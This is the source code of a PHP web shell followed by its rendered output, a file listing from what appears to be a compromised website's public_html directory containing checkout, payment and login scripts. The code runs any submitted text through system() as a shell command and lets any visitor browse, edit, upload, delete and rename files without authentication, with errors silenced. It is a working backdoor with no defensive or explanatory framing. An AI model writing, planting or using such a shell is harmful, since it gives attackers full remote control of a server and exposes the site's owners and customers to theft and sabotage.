<html>
<head>
<title>
</title>
</head>
<body>
<style type="text/css">
body{
background: #E4E4E4;
color: #666666;
font-family: Verdana;
font-size: 11px;
}
a:link{
color: #33CC99;
}
a:visited{
color: #33CC99;
}
a:hover{
text-decoration: none;
Color: #3399FF;
}
table {
font-size: 11px;
}
</style>
<?php
error_reporting (0);
set_time_limit (0);
if (empty ($_GET ['dir'])){
$dir = getcwd ();
}
else {
$dir = $_GET ['dir'];
}
chdir ($dir);
$current = htmlentities ($_SERVER ['PHP_SELF'] . "?dir=" . $dir);

echo "<i>Server: " . $_SERVER ['SERVER_NAME'] . "<br>\n";
echo "Current directory: " . getcwd () . "<br>\n";
echo "Software: " . $_SERVER ['SERVER_SOFTWARE'] . "<pre>\n\n</pre></i>\n";
echo "<pre>\n\n\n</pre>";

echo "<table width = 50%>";
echo "<tr>";
echo "<td><a href = '".$current."&mode=system'>Shell Command</a></td>\n";
echo "<td><a href = '".$current."&mode=create'>Create a new file</a></td>\n";
echo "<td><a href = '".$current."&mode=upload'>Upload file</a></td>\n";
echo "</tr></table>";
echo "<pre>\n\n</pre>";



$mode = $_GET ['mode'];
switch ($mode){
case 'edit':
$file = $_GET ['file'];
$new = $_POST ['new'];
if (empty ($new)){
$fp = fopen ($file, "r");
$file_cont = fread ($fp, filesize ($file));
$file_cont = str_replace ("<textarea>", "<textarea>", $file_cont);
echo "<form action = '".$current."&mode=edit&file=".$file."' method = 'POST'>\n";
echo "File: ". $file . "<br>\n";
echo "<textarea name = 'new' rows = '30' cols = '50'>".$file_cont."<textarea><br>\n";
echo "<input type = 'submit' value = 'Edit'></form>\n";
}
else {
$fp = fopen ($file, "w");
if (fwrite ($fp, $new)){
echo $file . " edited.<p>";
}
else {
echo "Unable to edit " . $file . ".<p>";
}
}
fclose ($fp);
break;
case 'delete':
$file = $_GET ['file'];
if (unlink ($file)){
echo $file . " deleted successfully.<p>";
}
else {
echo "Unable to delete " . $file . ".<p>";
}
break;
case 'copy':
$src = $_GET ['src'];
$dst = $_POST ['dst'];
if (empty ($dst)){
echo "<form action = '".$current . "&mode=copy&src=" . $src . "' method = 'POST'>\n";
echo "Destination: <input name = 'dst'><br>\n";
echo "<input type = 'submit' value = 'Copy'></form>\n";
}
else {
if (copy ($src, $dst)){
echo "File copied successfully.<p>\n";
}
else {
echo "Unable to copy " . $src . ".<p>\n";
}
}
break;
case 'move':
$src = $_GET ['src'];
$dst = $_POST ['dst'];
if (empty ($dst)){
echo "<form action = '".$current . "&mode=move&src=" . $src . "' method = 'POST'>\n";
echo "Destination: <input name = 'dst'><br>\n";
echo "<input type = 'submit' value = 'Move'></form>\n";
}
else {
if (rename ($src, $dst)){
echo "File moved successfully.<p>\n";
}
else {
echo "Unable to move " . $src . ".<p>\n";
}
}
break;
case 'rename':
$old = $_GET ['old'];
$new = $_POST ['new'];
if (empty ($new)){
echo "<form action = '".$current . "&mode=rename&old=" . $old . "' method = 'POST'>\n";
echo "New name: <input name = 'new'><br>\n";
echo "<input type = 'submit' value = 'Rename'></form>\n";
}
else {
if (rename ($old, $new)){
echo "File/Directory renamed successfully.<p>\n";
}
else {
echo "Unable to rename " . $old . ".<p>\n";
}
}
break;

case 'rmdir':
$rm = $_GET ['rm'];
if (rmdir ($rm)){
echo "Directory removed successfully.<p>\n";
}
else {
echo "Unable to remove " . $rm . ".<p>\n";
}
break;
case 'system':
$cmd = $_POST ['cmd'];
if (empty ($cmd)){
echo "<form action = '".$current . "&mode=system' method = 'POST'>\n";
echo "Shell Command: <input name = 'cmd'>\n";
echo "<input type = 'submit' value = 'Run'></form><p>\n";
}
else {
system ($cmd);
}
break;
case 'create':
$new = $_POST ['new'];
if (empty ($new)){
echo "<form action = '".$current . "&mode=create' method = 'POST'>\n";
echo "<tr><td>New file: <input name = 'new'></td>\n";
echo "<td><input type = 'submit' value = 'Create'></td></tr></form>\n<p>";
}
else {
if ($fp = fopen ($new, "w")){
echo "File created successfully.<p>\n";
}
else {
echo "Unable to create ".$file.".<p>\n";
}
fclose ($fp);
}
break;
case 'upload':
$temp = $_FILES['upload_file']['tmp_name'];
$file = basename($_FILES['upload_file']['name']);
if (empty ($file)){
echo "<form action = '".$current . "&mode=upload' method = 'POST' ENCTYPE='multipart/form-data'>\n";
echo "Local file: <input type = 'file' name = 'upload_file'>\n";
echo "<input type = 'submit' value = 'Upload'>\n";
echo "</form>\n<pre>\n\n</pre>";
}
else {
if(move_uploaded_file($temp,$file)){
echo "File uploaded successfully.<p>\n";
unlink ($temp);
}
else {
echo "Unable to upload " . $file . ".<p>\n";
}
}
break;



}







clearstatcache ();

echo "<pre>\n\n</pre>";
echo "<table width = 100%>\n";
$files = scandir ($dir);
foreach ($files as $file){
if (is_file ($file)){

$size = round (filesize ($file) / 1024, 2);
echo "<tr><td>".$file."</td>";
echo "<td>".$size." KB</td>";
echo "<td><a href = ".$current . "&mode=edit&file=".$file.">Edit</a></td>\n";
echo "<td><a href = ".$current . "&mode=delete&file=".$file.">Delete</a></td>\n";
echo "<td><a href = ".$current . "&mode=copy&src=".$file.">Copy</a></td>\n";
echo "<td><a href = ".$current . "&mode=move&src=".$file.">Move</a></td>\n";
echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Remame</a></td></tr>\n";
}
else {
$items = scandir ($file);
$items_num = count ($items) - 2;
echo "<tr><td>".$file."</td>";
echo "<td>".$items_num." Items</td>";
echo "<td><a href = ".$current . "/" . $file.">Change directory</a></td>\n";
echo "<td><a href = ".$current . "&mode=rmdir&rm=".$file.">Remove directory</a></td>\n";
echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Rename directory</a></td></tr>\n";
}
}
echo "</table>\n";
?>
<textarea><br>
<input type = 'submit' value = 'Edit'></form>
<pre>

</pre><table width = 100%>
<tr><td>.</td><td>61 Items</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html/.>Change directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rmdir&rm=.>Remove directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=.>Rename directory</a></td></tr>
<tr><td>..</td><td>26 Items</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html/..>Change directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rmdir&rm=..>Remove directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=..>Rename directory</a></td></tr>
<tr><td>.htaccess</td><td>0.51 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=.htaccess>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=.htaccess>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=.htaccess>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=.htaccess>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=.htaccess>Remame</a></td></tr>
<tr><td>404.php</td><td>0 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=404.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=404.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=404.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=404.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=404.php>Remame</a></td></tr>
<tr><td>PHPMailer</td><td>9 Items</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html/PHPMailer>Change directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rmdir&rm=PHPMailer>Remove directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=PHPMailer>Rename directory</a></td></tr>
<tr><td>about.php</td><td>0.78 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=about.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=about.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=about.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=about.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=about.php>Remame</a></td></tr>
<tr><td>admin</td><td>49 Items</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html/admin>Change directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rmdir&rm=admin>Remove directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=admin>Rename directory</a></td></tr>
<tr><td>admin.zip</td><td>18253.47 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=admin.zip>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=admin.zip>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=admin.zip>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=admin.zip>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=admin.zip>Remame</a></td></tr>
<tr><td>assets</td><td>5 Items</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html/assets>Change directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rmdir&rm=assets>Remove directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=assets>Rename directory</a></td></tr>
<tr><td>book-1.php</td><td>5.38 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=book-1.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=book-1.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=book-1.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=book-1.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=book-1.php>Remame</a></td></tr>
<tr><td>book.php</td><td>0 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=book.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=book.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=book.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=book.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=book.php>Remame</a></td></tr>
<tr><td>cal.php</td><td>3.98 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=cal.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=cal.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=cal.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=cal.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=cal.php>Remame</a></td></tr>
<tr><td>calendar-1.php</td><td>3.63 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=calendar-1.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=calendar-1.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=calendar-1.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=calendar-1.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=calendar-1.php>Remame</a></td></tr>
<tr><td>calendar.php</td><td>2.89 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=calendar.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=calendar.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=calendar.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=calendar.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=calendar.php>Remame</a></td></tr>
<tr><td>cart-2.php</td><td>3.03 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=cart-2.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=cart-2.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=cart-2.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=cart-2.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=cart-2.php>Remame</a></td></tr>
<tr><td>cart.php</td><td>3.33 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=cart.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=cart.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=cart.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=cart.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=cart.php>Remame</a></td></tr>
<tr><td>checkout-2.php</td><td>10.04 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=checkout-2.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=checkout-2.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=checkout-2.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=checkout-2.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=checkout-2.php>Remame</a></td></tr>
<tr><td>checkout-3.php</td><td>14.41 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=checkout-3.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=checkout-3.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=checkout-3.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=checkout-3.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=checkout-3.php>Remame</a></td></tr>
<tr><td>checkout.php</td><td>5.7 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=checkout.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=checkout.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=checkout.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=checkout.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=checkout.php>Remame</a></td></tr>
<tr><td>contact-handler.php</td><td>3.34 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=contact-handler.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=contact-handler.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=contact-handler.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=contact-handler.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=contact-handler.php>Remame</a></td></tr>
<tr><td>contact.php</td><td>4.67 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=contact.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=contact.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=contact.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=contact.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=contact.php>Remame</a></td></tr>
<tr><td>cust_regis.php</td><td>1.19 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=cust_regis.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=cust_regis.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=cust_regis.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=cust_regis.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=cust_regis.php>Remame</a></td></tr>
<tr><td>details.php</td><td>0.92 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=details.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=details.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=details.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=details.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=details.php>Remame</a></td></tr>
<tr><td>diet-consultation.php</td><td>1.81 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=diet-consultation.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=diet-consultation.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=diet-consultation.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=diet-consultation.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=diet-consultation.php>Remame</a></td></tr>
<tr><td>doct_list.php</td><td>7.3 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=doct_list.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=doct_list.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=doct_list.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=doct_list.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=doct_list.php>Remame</a></td></tr>
<tr><td>doctor-checkup.php</td><td>3.34 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=doctor-checkup.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=doctor-checkup.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=doctor-checkup.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=doctor-checkup.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=doctor-checkup.php>Remame</a></td></tr>
<tr><td>edit_profile.php</td><td>0.98 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=edit_profile.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=edit_profile.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=edit_profile.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=edit_profile.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=edit_profile.php>Remame</a></td></tr>
<tr><td>error_log</td><td>27900.92 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=error_log>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=error_log>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=error_log>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=error_log>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=error_log>Remame</a></td></tr>
<tr><td>get_package.php</td><td>0.37 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=get_package.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=get_package.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=get_package.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=get_package.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=get_package.php>Remame</a></td></tr>
<tr><td>includes</td><td>10 Items</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html/includes>Change directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rmdir&rm=includes>Remove directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=includes>Rename directory</a></td></tr>
<tr><td>index.php</td><td>14.93 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=index.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=index.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=index.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=index.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=index.php>Remame</a></td></tr>
<tr><td>login.php</td><td>2.34 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=login.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=login.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=login.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=login.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=login.php>Remame</a></td></tr>
<tr><td>login_do.php</td><td>0.68 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=login_do.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=login_do.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=login_do.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=login_do.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=login_do.php>Remame</a></td></tr>
<tr><td>logout.php</td><td>0.09 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=logout.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=logout.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=logout.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=logout.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=logout.php>Remame</a></td></tr>
<tr><td>meditation.php</td><td>2.15 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=meditation.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=meditation.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=meditation.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=meditation.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=meditation.php>Remame</a></td></tr>
<tr><td>name.php</td><td>0 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=name.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=name.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=name.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=name.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=name.php>Remame</a></td></tr>
<tr><td>package.php</td><td>4.62 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=package.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=package.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=package.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=package.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=package.php>Remame</a></td></tr>
<tr><td>parenting.php</td><td>3.06 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=parenting.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=parenting.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=parenting.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=parenting.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=parenting.php>Remame</a></td></tr>
<tr><td>payment-process-old.php</td><td>1.27 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=payment-process-old.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=payment-process-old.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=payment-process-old.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=payment-process-old.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=payment-process-old.php>Remame</a></td></tr>
<tr><td>payment-process.php</td><td>2.75 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=payment-process.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=payment-process.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=payment-process.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=payment-process.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=payment-process.php>Remame</a></td></tr>
<tr><td>payment.php</td><td>0.19 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=payment.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=payment.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=payment.php>Copy</a></td>
